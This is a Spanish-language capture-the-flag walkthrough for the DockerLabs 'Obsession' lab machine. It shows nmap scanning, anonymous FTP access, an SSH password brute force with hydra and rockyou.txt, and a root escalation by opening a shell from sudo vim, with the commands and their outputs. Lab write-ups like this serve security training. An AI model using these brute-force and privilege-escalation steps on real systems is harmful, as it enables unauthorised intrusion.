# 🎯 Obsession - DockerLabs

## 🔍 Fase 1: Enumeración

### Escaneo de puertos
`sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2`

**Resultado:**
`21/tcp open  ftp`
`22/tcp open  ssh`
`80/tcp open  http`

### Escaneo de versiones
`sudo nmap -sCV -p21,22,80 172.17.0.2`

**Resultado:**
`21/tcp open  ftp     vsftpd 3.0.5 (Anonymous login allowed)`
`22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu`
`80/tcp open  http    Apache httpd 2.4.58`

---

## 🌐 Fase 2: Reconocimiento web y FTP

### Web
`curl http://172.17.0.2`
En la página aparece el email: `russoski@dockerlabs.es`
**Usuario potencial:** `russoski`

### FTP (acceso anónimo)
`ftp 172.17.0.2`
Usuario: `anonymous`
Contraseña: (vacío)

**Archivos encontrados:**
- `chat-gonza.txt`
- `pendientes.txt`

### Descargar y leer archivos
`get chat-gonza.txt`
`get pendientes.txt`
`exit`
`cat chat-gonza.txt`

**En el chat aparecen los usuarios:** `Gonza` y `Russoski`

---

## 🔑 Fase 3: Fuerza bruta SSH

`hydra -l russoski -P /home/moon/Documents/WorldList/rockyou.txt ssh://172.17.0.2 -t 4`

**Resultado:**
`[22][ssh] host: 172.17.0.2 login: russoski password: iloveme`

---

## 🚪 Fase 4: Acceso SSH

`ssh russoski@172.17.0.2`
Contraseña: `iloveme`

---

## ⚡ Fase 5: Escalada a root

### Ver permisos sudo
`sudo -l`

**Resultado:**
`(root) NOPASSWD: /usr/bin/vim`

### Explotar vim
`sudo /usr/bin/vim`

**Dentro de vim:**
`:!sh`

### Verificar
`whoami`
`root`

---
